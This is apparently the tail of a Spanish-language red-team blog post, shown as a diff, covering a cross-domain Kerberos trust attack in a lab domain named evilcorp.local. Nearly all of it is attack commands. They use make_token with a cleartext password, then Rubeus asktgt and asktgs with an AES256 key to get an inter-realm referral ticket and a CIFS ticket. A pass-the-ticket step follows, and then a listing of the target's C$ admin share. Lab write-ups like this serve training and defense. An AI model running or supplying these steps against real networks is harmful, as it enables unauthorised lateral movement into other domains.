+make_token dev\jadams Qwerty123!
+
+ls \\ad.sucursal.external\c$
+
+---
+
+<span style="color:#75715e">####################################</span>
+<span style="color:#75715e">#		  RC4/AES256			   #</span>
+<span style="color:#75715e">####################################</span>
+
+<span style="color:#75715e"># 1. Solicitamos un tgt del usuario que este en el usuario externo</span>
+execute-assembly /opt/tools/rubeus/Rubeus.exe asktgt /user<span style="color:#960050;background-color:#1e0010">:</span>jadams /domain<span style="color:#960050;background-color:#1e0010">:</span>dev.evilcorp.local /aes256<span style="color:#960050;background-color:#1e0010">:</span>5C8838A1D0F155C70ABB3C93ADACF1912826F149E276A445EF76E7821A89390A /nowrap /opsec
+
+<span style="color:#75715e"># 2. Solicitamos un ticket de referencia entre reinos</span>
+execute-assembly /opt/tools/rubeus/Rubeus.exe asktgs /user<span style="color:#960050;background-color:#1e0010">:</span>jadams /service<span style="color:#960050;background-color:#1e0010">:</span>krbtgt/sucursal.external /domain<span style="color:#960050;background-color:#1e0010">:</span>dev.evilcorp.local /dc<span style="color:#960050;background-color:#1e0010">:</span>dc-2.dev.evilcorp.local /ticket<span style="color:#960050;background-color:#1e0010">:</span>[..Ticket..] /nowrap
+
+<span style="color:#75715e"># 3. Con el TGS de referencia entre reinos solicitados anteriormente, ahora solicitamos un tgs en el dominio de destino</span>
+execute-assembly /opt/tools/rubeus/Rubeus.exe asktgs /service<span style="color:#960050;background-color:#1e0010">:</span>cifs/ad.sucursal.external /domain<span style="color:#960050;background-color:#1e0010">:</span>sucursal.external /dc<span style="color:#960050;background-color:#1e0010">:</span>ad.sucursal.external /ticket<span style="color:#960050;background-color:#1e0010">:</span>[..TGS de Referencia..]= /nowrap
+
+<span style="color:#75715e"># Impersonalizamos al usuario e inyectamos el ticket</span>
+make_token dev\jadams Fakepassw!
+
+execute-assembly /opt/tools/rubeus/Rubeus.exe ptt /ticket<span style="color:#960050;background-color:#1e0010">:</span>[..Tgs..]
+
+ls \\ad.sucursal.external\c$
+
+</code></pre></div>
+    </div>
+    <div class="post-footer">
+      
+    </div>
+  </article>
+
+    </main>
+  </body>
+</html>
